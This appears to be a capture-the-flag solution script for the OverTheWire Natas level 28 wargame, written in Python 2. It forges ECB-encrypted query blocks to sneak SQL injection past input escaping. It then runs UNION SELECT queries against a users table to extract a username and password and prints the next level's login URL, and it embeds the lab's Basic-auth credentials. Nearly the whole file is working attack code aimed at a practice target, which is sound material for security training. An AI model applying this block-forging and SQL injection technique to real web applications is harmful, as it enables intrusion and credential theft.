#!/usr/bin/env python

import sys
import re
import base64
import urllib
import urllib2
import urlparse
import binascii


def usage():
	print 'Usage: '+sys.argv[0]+' [-e] query'

def getarg():
	if len(sys.argv) > 1:
		if sys.argv[1] == "-e":
			if len(sys.argv) > 2:
				return eval(sys.argv[2])
		else:
			return sys.argv[1]
	return None

def sendQueryString(query):
	request = urllib2.Request("http://natas28.natas.labs.overthewire.org/index.php?%s" % urllib.urlencode({ 'query' : query}))
	request.add_header("Authorization", "Basic %s" % base64.encodestring('natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF') )
	result = urllib2.urlopen(request)
	return (result.geturl(),result.read())

def sendQueryBinary(binaryquery):
	query = base64.b64encode(binaryquery)
	request = urllib2.Request("http://natas28.natas.labs.overthewire.org/search.php/?%s" % urllib.urlencode({ 'query' : query}))
	request.add_header("Authorization", "Basic %s" % base64.encodestring('natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF') )
	result = urllib2.urlopen(request)
	return (result.geturl(),result.read())

def getContent(html):
	startstr = '<div id="content">\r\n'
	endstr = '</div>'
	start = html.find(startstr)
	end = html.find(endstr)
	if start == -1:
		start = 0
	if end == -1:
		end = len(html)
	start = start + len(startstr)
	return html[start:end]

def getQueryBinary(url):
	parsed = urlparse.urlparse(url)
	return base64.decodestring(urllib.unquote(parsed.query[6:]))

def bin2str(binary):
	length = 32
	hexa = binary.encode('hex_codec')
	return ' '.join(hexa[i:i+length] for i in xrange(0,len(hexa),length))

def trial(string, message=None, length=None):
	url,html = sendQueryString(string)
	if message == None:
		message = string
	if length != None:
		message = '{{:{:d}s}}'.format(length).format(message)
	print '{}: {}'.format(message, bin2str(getQueryBinary(url)))

def sendQueryInject(sql):
	url1,html1 = sendQueryString('B'*10+chr(16)*16+'B'*3) # first 3 blocks from this
	url2,html2 = sendQueryString('B'*9+'\''+sql) # after the first 3 blocks from this
	forgedQuery = getQueryBinary(url1)[:3*16]+getQueryBinary(url2)[3*16:]
	return sendQueryBinary(forgedQuery)
	
def main():

	# ECB mode, query string is included somewhere
	if False:
		for i in range(10,14):
			trial(str(i))

	# Block size is 16 bytes
	# Plaintext length is 67 + query length
	if False:
		for i in range(0,64):
			trial('A'*i, str(i), 2)

	# Full PKCS7 Padding Block is d8ae51d7da71b2b083d919a0d7b88b98
	# Next block after 10 characters
	if False:
		for i in range(0,14):
			trial('B'*i+chr(16)*16+'B'*(13-i), str(i), 2)

	# Start position is 38
	if False:
		for i in range(0,16):
			trial('B'*i+'A'*32, str(i), 2)

	# results = [chr(i) for i in [0, 10, 13, 26, 34, 39, 92]] characters escaped (mysql_real_escape_string)
	# the last character is ';'
 	if False:
		for i in range(0,255):
			trial('B'*10+chr(i)+chr(15)*15+'B'*4, re.sub(r'[^\x21-\x7e]',r'', chr(i))+' '+str(i), 5)
		for i in [0, 10, 13, 26, 34, 39, 92]:
			trial('B'*9+chr(i)+chr(15)*15+'B'*4, re.sub(r'[^\x21-\x7e]',r'', chr(i))+' '+str(i), 5)
	
	# Interactive
 	if False:
		#inject = " OR 1=1; #"
		inject = " " + sys.argv[1] + "#"
		url,html = sendQueryInject(inject)
		print html
		print url
	

	# Interactive 2
 	if False:
		query = getarg()
		if query == None:
			usage()
			sys.exit(1)
		url,html = sendQueryString(query)
		#url,html = sendQueryBinary(query)
		#print getContent(html)
		#print bin2str(getQueryBinary(url))

	# Solution
 	if True:
		urlUser,htmlUser = sendQueryInject(" AND 0=1 UNION SELECT username from users; #")
		urlPassword,htmlPassword = sendQueryInject(" AND 0=1 UNION SELECT password from users; #")
		user = re.search(r'<ul><li>(.*)</li></ul>', htmlUser).groups()[0]
		password = re.search(r'<ul><li>(.*)</li></ul>', htmlPassword).groups()[0]
		print urlUser
		print urlPassword
		print user
		print password
		print "http://"+user+":"+password+"@natas29.natas.labs.overthewire.org/"

if __name__ =='__main__':
    main()